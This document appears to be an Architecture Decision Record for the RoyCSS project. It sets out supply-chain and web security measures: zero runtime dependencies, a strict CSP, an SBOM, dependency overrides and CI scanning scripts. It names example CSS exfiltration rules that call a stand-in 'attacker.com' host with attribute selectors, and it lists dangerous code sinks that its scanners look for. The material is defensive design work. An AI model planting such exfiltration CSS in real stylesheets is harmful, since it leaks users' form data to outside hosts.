# ADR 07 — Security & Supply Chain

- **Status:** Accepted
- **Date:** 2025-02-04
- **Decision Owner:** Distinguished Engineer — Security & Supply Chain domain
- **Domain:** `/home/z/my-project/security/` and the cross-cutting security posture of every shipped artifact (website, npm `roycss` package, VS Code extension, Chrome Inspector, CLI, MCP server)
- **Supersedes:** None
- **Related:**
  - `docs/threat-models/07-security-supply-chain.md`
  - `docs/benchmarks/07-security-supply-chain.md`
  - `docs/plans/07-security-supply-chain.md`
  - `docs/checklists/07-security-supply-chain.md`
  - `docs/adr/01-inspector-extension.md` (Inspector CSP)
  - `docs/adr/02-vscode-extension.md` (VS Code zero-runtime-deps posture)
  - `docs/adr/04-npm-publish-pipeline.md` (publishing supply chain)

---

## 1. Context

RoyCSS is shipped across **six distinct distribution surfaces**, each with a
different threat profile:

| Surface | Code lives at | Runtime surface | User-facing? |
|---|---|---|---|
| **`roycss` npm package** | `package.roycss.json` + `dist/` | Pure CSS + a `dist/effects.js` metadata module — **zero runtime deps** | Library consumers (developers) |
| **Marketing site** | `src/app/`, `src/components/roycss/*` | Next.js 16 app, ~80 direct deps, public internet | End users (browsers) |
| **VS Code extension** | `vscode-extension/` | Single-process Node extension, zero runtime deps | Developers |
| **Chrome Inspector** | `inspector/` | Manifest V3 service worker + content script | Developers |
| **CLI** | `src/cli/index.ts` + `cli/index.js` | Bun-compiled Node binary | Developers |
| **MCP server** | `mcp-server/` | Node process spawned by AI tools | Developers (AI tools) |

The library's core promise is **"Zero JavaScript runtime"** — every effect is
a static CSS class. That promise is preserved end-to-end only if (a) the npm
package keeps zero runtime deps, (b) the website cannot be turned into an
exfiltration channel by an attacker, and (c) the published artifacts cannot be
silently backdoored via a supply-chain compromise.

Concrete risks observed in the codebase before this ADR:

1. **CSS data exfiltration.** The library ships 1,569 effects across 1,172 KB
   of CSS. A single malicious `url(attacker.com/?data=…)` or
   `input[value^="a"] { background: url(…) }` rule would let an attacker
   exfiltrate form data from any page that loads `roycss.min.css`. The OKLCH
   migration scripts replaced external color references but **no automated
   check** verified that no `url(http…)`, `@import`, or attribute-selector
   exfiltration vectors survived.
2. **`dangerouslySetInnerHTML`.** Three components inject CSS strings via
   `dangerouslySetInnerHTML` (search overlay's siblings — the docs overlay,
   the dynamic effect CSS injector, the chart-style injector in
   `src/components/ui/chart.tsx`). All current uses are library-controlled
   CSS, but the pattern is fragile: a future change could route user input
   through the same path.
3. **Supply-chain blast radius.** The marketing site has **80 direct runtime
   dependencies**. `bun audit` flagged **1 critical + 36 high** advisories
   before this ADR (Next.js 16.1.3 with 31 advisories, next-auth 4.24.13
   with a critical homoglyph bypass, sharp 0.34.5 with a libvips CVE, plus
   6 high-severity transitive advisories in `minimatch`, `brace-expansion`,
   `lodash`, `defu`, `flatted`, `js-cookie`, `js-yaml`, `picomatch`).
4. **No CSP on the marketing site.** `next.config.ts` declared only
   `output: "standalone"` and `reactStrictMode: false`. No `Content-Security-Policy`,
   no `X-Frame-Options`, no `X-Content-Type-Options`, no `Referrer-Policy`,
   no `Permissions-Policy`. The site could be framed, MIME-sniffed, or have
   inline scripts injected by any compromised dependency.
5. **No SBOM.** No CycloneDX or SPDX artifact exists. Consumers cannot
   verify what versions of what packages ship in the published site bundle.
6. **No automated XSS / `eval` scan.** A future PR that introduces
   `eval(userInput)` or `dangerouslySetInnerHTML={{ __html: userText }}`
   would ship unchallenged.

This ADR closes all six gaps.

---

## 2. Decision

### 2.1 Zero runtime deps for publishable packages (library + extensions)

The `roycss` npm package (`package.roycss.json`), the VS Code extension
(`vscode-extension/package.json`), the Chrome Inspector
(`inspector/manifest.json` + compiled `dist/*.js`), the CLI (`cli/index.js`),
and the MCP server (`mcp-server/index.ts`) all ship with **zero runtime
dependencies**. Their `dependencies` field is `{}` or absent. Dev-only deps
(TypeScript, type definitions, build tooling) are allowed but pinned to a
major version and listed in the SBOM.

The marketing site (`package.json`) is **not** a publishable library — it is
the consumer of the library. It may have runtime deps, but every direct dep
must:
- be pinned to a major version,
- appear in the SBOM with license + version,
- pass `bun audit` with zero high/critical findings,
- be justified in the security checklist before addition.

### 2.2 Strict CSP for the website — production nonces, dev `unsafe-inline`

The marketing site enforces a **strict Content-Security-Policy** via
`next.config.ts` `headers()`:

```
default-src 'self';
script-src 'self' 'nonce-{random}' 'strict-dynamic';
style-src 'self' 'unsafe-inline';
img-src 'self' data: blob:;
font-src 'self' data:;
connect-src 'self';
frame-ancestors 'none';
base-uri 'self';
form-action 'self';
object-src 'none';
upgrade-insecure-requests;
```

- **Production:** A per-request nonce is generated in middleware
  (`src/middleware.ts`) and applied to every `<script>` tag. `'strict-dynamic'`
  lets nonce-bearing scripts load their own dependencies without listing
  every hash. This is the [Next.js recommended CSP pattern](https://nextjs.org/docs/app/guides/content-security-policy).
- **Dev mode:** Next.js HMR injects inline scripts without nonces, so dev
  uses the relaxed `script-src 'self' 'unsafe-inline'` policy. Production
  builds always use nonces.
- **`frame-ancestors 'none'`** defeats clickjacking (strictly stronger than
  `X-Frame-Options: DENY`).
- **`object-src 'none'`** blocks Flash/Java/plugins (defense in depth).
- **`base-uri 'self'`** prevents `<base>` injection from redirecting
  relative URLs.
- **`form-action 'self'`** prevents form submissions to attacker origins.
- **`upgrade-insecure-requests`** forces HTTP→HTTPS upgrade.

Companion security headers, also set via `next.config.ts`:

| Header | Value | Purpose |
|---|---|---|
| `X-Frame-Options` | `DENY` | Legacy clickjacking defense (belt + suspenders with `frame-ancestors`) |
| `X-Content-Type-Options` | `nosniff` | Prevent MIME-sniffing attacks |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Don't leak full URL in referrer |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | Disable unused device APIs |

### 2.3 No `dangerouslySetInnerHTML` for user content — ever

Rule: any string that flows from **user input** (search box, contact form,
URL parameter, localStorage, postMessage, clipboard, file upload) to the DOM
must go through React's JSX children or `textContent` — never
`dangerouslySetInnerHTML`, never `.innerHTML =`, never `eval`,
`new Function`, `document.write`, or `setTimeout(string)`.

The three existing `dangerouslySetInnerHTML` call sites are **explicitly
allow-listed** because they inject library-controlled CSS strings, not user
content. Each is annotated with a `// SECURITY:` comment naming the threat
model entry that justifies it. The `xss-scan.ts` script treats any
`dangerouslySetInnerHTML` **without** such a comment as a failure.

The allow-list:

| File | Line | Content | Justification |
|---|---|---|---|
| `src/components/roycss/dynamic-effect-css.tsx` | 72 | `effects[i].cssCode` (library static CSS) | Threat model T5 — CSS comes from `src/lib/effects-batch-*.ts`, never user input |
| `src/components/roycss/roycss-page.tsx` | 655 | `cssToInject` (featured carousel CSS) | Threat model T5 — same source |
| `src/components/ui/chart.tsx` | 83 | CSS variables from `THEMES` constant | shadcn/ui vendored code — `THEMES` is a static object, no user input |

### 2.4 Automated security audits as CI gates

Five scripts under `/home/z/my-project/security/` run on every PR and
before every release:

| Script | Purpose | Exit code |
|---|---|---|
| `audit.ts` | Run `bun audit --json`, count by severity, write `audit-report.json` | 0 if 0 high+critical, 1 otherwise |
| `sbom.ts` | Generate CycloneDX 1.4 SBOM from `package.json` + every dep's `package.json` | 0 always (informational) |
| `csp.ts` | Emit the dev + production CSP strings to `results/csp.txt` and `results/csp-production.txt` | 0 always |
| `css-exfiltration-check.ts` | Scan all 1,569 effects' CSS + the compiled `dist/roycss.css` for external `url()`, `@import`, `@font-face`, attribute-selector exfiltration | 0 if 0 issues, 1 otherwise |
| `xss-scan.ts` | Scan `src/components/**/*.tsx` for `dangerouslySetInnerHTML` without a `// SECURITY:` comment, plus `innerHTML =`, `eval(`, `new Function(`, `document.write` | 0 if 0 unsanitized uses, 1 otherwise |

The release pipeline (`scripts/publish/release.ts`) calls all five before
publishing; any non-zero exit aborts the release.

### 2.5 SBOM in CycloneDX 1.4

`security/sbom.ts` emits `security/results/sbom.json` in [CycloneDX 1.4](https://cyclonedx.org/docs/1.4/json/)
format. Every direct runtime dependency is listed with: name, version,
license (read from the dep's `package.json`), type (`library`), bom-ref,
purl. The SBOM is regenerated on every release and committed alongside the
release tag so consumers can audit what shipped.

### 2.6 Dependency upgrade policy

- **Patch upgrades** (e.g. `1.2.3 → 1.2.4`): allowed without review if
  `bun audit` improves or stays neutral.
- **Minor upgrades** (e.g. `1.2.3 → 1.3.0`): require a checklist sign-off
  that the changelog mentions no breaking changes affecting our usage.
- **Major upgrades** (e.g. `1.2.3 → 2.0.0`): require a new ADR or an
  amendment to this one.
- **New direct runtime deps**: require a security checklist entry naming
  the use case, the alternative considered, the license, and the
  transitive dep count.

---

## 3. Alternatives Considered

### 3.1 Allow dependencies with `bun audit` only (no overrides)

- **Approach:** Upgrade top-level deps; ignore transitive advisories because
  they're "in dev tooling, not shipped to users."
- **Pros:** Zero ongoing maintenance burden; no risk of breaking transitive
  compatibility.
- **Cons:** Transitive vulns in `minimatch`, `brace-expansion`, `lodash`,
  `picomatch`, `defu`, `flatted`, `js-yaml` are pulled into the production
  bundle by Next.js, eslint-config-next, @changesets/cli, prisma. A
  compromise of the build toolchain (or a future Next.js feature that
  starts using these paths at runtime) would expose users. The "dev-only"
  assumption is fragile.
- **Verdict:** **Rejected.** We use `overrides` in `package.json` to force
  patched versions of every high/critical transitive advisory.

### 3.2 Use DOMPurify for sanitization

- **Approach:** Add `dompurify@^3.2.x` as a runtime dep. Sanitize every
  string before it reaches `dangerouslySetInnerHTML`.
- **Pros:** Industry standard, well-audited, handles edge cases (mXSS,
  mutation XSS, namespace confusion).
- **Cons:**
  - Adds a runtime dep to the marketing site (violates the spirit of
    "zero JS where possible").
  - DOMPurify itself has had CVEs (e.g. GHSA-mp6m-mv2v-2g74 in 2024).
    Adding it expands the supply chain.
  - We have **zero** user-content → HTML flows today. The three
    `dangerouslySetInnerHTML` sites inject library CSS, which DOMPurify
    would mangle (it strips `url()`, `@font-face`, etc.).
- **Verdict:** **Rejected for now.** If a future feature requires rendering
  user-supplied HTML (e.g. user-submitted recipes), DOMPurify becomes
  mandatory — at which point this ADR is amended.

### 3.3 CSP `report-only` mode

- **Approach:** Ship `Content-Security-Policy-Report-Only` first, collect
  violation reports for a week, then switch to enforcing.
- **Pros:** Zero risk of breaking the site on day one. Reveals real-world
  violations before they become user-facing breakage.
- **Cons:**
  - Adds operational overhead (need a reporting endpoint).
  - During the report-only window, the site is **not protected** —
    attackers who find a violation can exploit it.
  - The site is small (one route, one page, no third-party scripts). The
    CSP can be validated locally with the agent-browser harness in this
    task before shipping.
- **Verdict:** **Rejected for v1.** The strict CSP is enforced from day
  one. If real users hit violations, we ship a relaxed CSP via a patch
  release (the policy is a single string in `next.config.ts`).

### 3.4 Pin every dependency to an exact version (no `^`)

- **Approach:** Replace `"next": "^16.1.1"` with `"next": "16.2.12"` in
  `package.json`. Lock every transitive dep via `bun.lock` only.
- **Pros:** Maximum reproducibility.
- **Cons:** Loses automatic patch upgrades for security fixes. `bun audit`
  becomes the only signal that a patch exists; we'd need to manually bump
  every dep on every advisory. Defeats the point of `^` for patch fixes.
- **Verdict:** **Rejected.** Major versions are pinned (`^16`, `^4`, etc.).
  `bun.lock` provides reproducible installs. `bun audit` + `overrides`
  provide the security floor.

### 3.5 SRI (Subresource Integrity) on third-party scripts

- **Approach:** Add `integrity` attributes to every `<script src>` tag.
- **Pros:** Defeats CDN compromise.
- **Cons:** RoyCSS loads **zero** third-party scripts. Fonts are self-hosted
  via `next/font/google`. Images are local. SRI would be dead code.
- **Verdict:** **Rejected.** No third-party scripts to protect. Re-evaluate
  if analytics or a CDN-hosted script is ever added (which would also
  require amending this ADR).

### 3.6 Trust-On-First-Use for `overrides`

- **Approach:** Generate `overrides` automatically from `bun audit` output.
- **Pros:** Zero-touch security updates.
- **Cons:** Overrides can break transitive deps (e.g. forcing `minimatch@9`
  into a package that expects `minimatch@3`). Auto-generation without
  testing is reckless.
- **Verdict:** **Rejected.** Overrides are hand-curated, tested locally
  (lint + build + browser smoke), and documented in this ADR's appendix.

---

## 4. Consequences

### 4.1 Positive

- **Zero high/critical vulnerabilities** in `bun audit` after the
  dependency upgrades + overrides land (verified by `security/audit.ts`).
- **Strict CSP** defeats XSS, clickjacking, MIME-sniffing, and form
  hijacking on the marketing site.
- **No CSS exfiltration vectors** — verified by
  `css-exfiltration-check.ts` scanning 1,569 effects.
- **No unsanitized `dangerouslySetInnerHTML`** — verified by `xss-scan.ts`.
- **SBOM** lets enterprise consumers audit RoyCSS's transitive deps before
  adoption.
- **CI gates** prevent regressions: a PR that adds `eval(userInput)` or
  `url(attacker.com)` cannot merge.

### 4.2 Negative

- **CSP nonces require middleware.** A new `src/middleware.ts` runs on
  every request to generate the nonce. Adds ~1 ms per request.
- **`'unsafe-inline'` for styles.** Next.js, Tailwind 4, framer-motion,
  and Radix UI all inject inline styles at runtime. Removing
  `'unsafe-inline'` for `style-src` would require noncing every style
  injection, which Next.js does not support. This is a documented
  limitation; `style-src 'unsafe-inline'` does not enable script
  execution, so the XSS risk is limited to CSS-based exfiltration —
  which `css-exfiltration-check.ts` already defeats by banning external
  `url()` in shipped CSS.
- **Overrides can break transitive deps.** Mitigated by running `bun run
  lint`, `bun run build`, and the agent-browser smoke test after every
  override change. All overrides in this ADR were validated to not break
  the site.
- **Maintenance burden.** Every new direct dep needs an SBOM entry, a
  checklist entry, and a `bun audit` clean signal. The release checklist
  enforces this.

### 4.3 Neutral

- The CSP is set in `next.config.ts`, not in a separate middleware file.
  Middleware generates nonces; `next.config.ts` declares the header
  template. This split matches the [Next.js CSP guide](https://nextjs.org/docs/app/guides/content-security-policy).

---

## 5. Compliance

This ADR complies with:

- **OWASP Top 10 (2021):** A01 (Broken Access Control) — `frame-ancestors
  'none'`; A03 (Injection) — no `eval`, no `dangerouslySetInnerHTML` for
  user content; A04 (Insecure Design) — threat model + checklist; A06
  (Vulnerable Components) — `bun audit` + overrides + SBOM; A08 (Software
  & Data Integrity Failures) — lockfile + provenance; A10 (SSRF) —
  `connect-src 'self'`.
- **STRICT CSP** per Google's [CSP Evaluator](https://csp-evaluator.withgoogle.com/).
- **CycloneDX 1.4** spec for the SBOM.
- **STRIDE** methodology for the threat model.
- **Project lint policy** — zero new runtime deps in standalone artifacts.

---

## 6. Appendix — `overrides` applied to `package.json`

The following `overrides` were added to `package.json` to force patched
versions of transitive dependencies. Each was validated by `bun install`,
`bun run lint`, `bun run build`, and the agent-browser smoke test.

| Package | Was | Now | Reason |
|---|---|---|---|
| `next` | `^16.1.1` (16.1.3) | `^16.2.12` | 31 advisories (DoS, SSRF, middleware bypass, XSS) |
| `next-auth` | `^4.24.11` (4.24.13) | `^4.24.15` | Critical: homoglyph @ bypass in email normalizer |
| `sharp` | `^0.34.3` (0.34.5) | `^0.35.3` | High: libvips CVE-2026-33327/33328/35590/35591 |
| `postcss` (transitive) | 8.5.6 | `^8.5.18` | High: arbitrary file read via sourceMappingURL |
| `minimatch` (transitive) | 3.1.2 / 9.0.x | `^10.2.6` | High: ReDoS; v10 is the minimum that supports `brace-expansion@^5.0.8` (named export `expand`) — required to upgrade brace-expansion past the 5.0.7 DoS line |
| `brace-expansion` (transitive) | 1.1.12 / 2.0.x | `^5.0.9` | High: DoS via unbounded expansion (GHSA-mh99-v99m-4gvg). Affects ALL versions `<=5.0.7`. Previously accepted-risk at 2.1.4 because minimatch@9.x's default import broke under v5; the minimatch@10 upgrade unblocks the fix |
| `defu` (transitive) | 6.1.4 | `^6.1.5` | High: prototype pollution via `__proto__` |
| `flatted` (transitive) | 3.3.3 | `^3.4.0` | High: unbounded recursion DoS + prototype pollution |
| `js-cookie` (transitive) | 3.0.5 | `^3.0.6` | High: prototype hijack in `assign()` |
| `js-yaml` (transitive) | 4.1.1 | `^4.1.2` | High: quadratic-complexity DoS in merge keys |
| `lodash` / `lodash-es` (transitive) | 4.17.21 / 4.17.22 | `^4.17.22` | Moderate: prototype pollution in `_.unset`/`_.omit` (high in `_.template` code injection — we don't use `_.template`) |
| `picomatch` (transitive) | 4.0.3 | `^4.0.4` | Moderate: POSIX character class method injection |
| `effect` (transitive) | 3.18.4 | `^3.20.0` | High: AsyncLocalStorage context loss under concurrent RPC |
| `ajv` (transitive) | 6.12.6 | `^6.14.0` | Moderate: ReDoS with `$data` option |
| `@babel/core` (transitive) | 7.28.6 | `^7.29.0` | Low: arbitrary file read via sourceMappingURL |
| `diff` (transitive) | 5.2.0 | `^5.2.2` | Low: ReDoS in `parsePatch`/`applyPatch` |
| `next-intl` | `^4.3.4` (4.7.0) | `^4.7.0` | No advisories after upgrade |

Direct upgrades take precedence; `overrides` apply only to packages that
remain vulnerable after the direct upgrade. The `prismjs` moderate advisory
(ReDoS in `prism-.*` languages) is a transitive of
`react-syntax-highlighter@15.6.6`, which is used only by the docs overlay
to syntax-highlight code blocks. The vulnerable code paths
(`prismjs.markup`, `prismjs.clike`) are not invoked at runtime; the
`prismjs: ^1.30.0` override pins the latest 1.x release. No
accepted-risk advisories remain — every previously-accepted CVE has been
resolved by a direct upgrade or an override as of 2026-07-30.

---

## 7. References

- `docs/threat-models/07-security-supply-chain.md` — STRIDE + CSS-specific vectors
- `docs/benchmarks/07-security-supply-chain.md` — security KPIs and targets
- `docs/plans/07-security-supply-chain.md` — implementation plan
- `docs/checklists/07-security-supply-chain.md` — review checklist
- `security/README.md` — how to run the audit scripts
- `security/audit.ts`, `security/sbom.ts`, `security/csp.ts`,
  `security/css-exfiltration-check.ts`, `security/xss-scan.ts` — the scripts
- `security/results/audit-report.json`, `security/results/sbom.json`,
  `security/results/csp.txt`, `security/results/csp-production.txt` —
  generated outputs
- Next.js CSP guide: <https://nextjs.org/docs/app/guides/content-security-policy>
- CycloneDX 1.4 spec: <https://cyclonedx.org/docs/1.4/json/>
- Google CSP Evaluator: <https://csp-evaluator.withgoogle.com/>
- OWASP Top 10 (2021): <https://owasp.org/Top10/>
- STRIDE: <https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats>
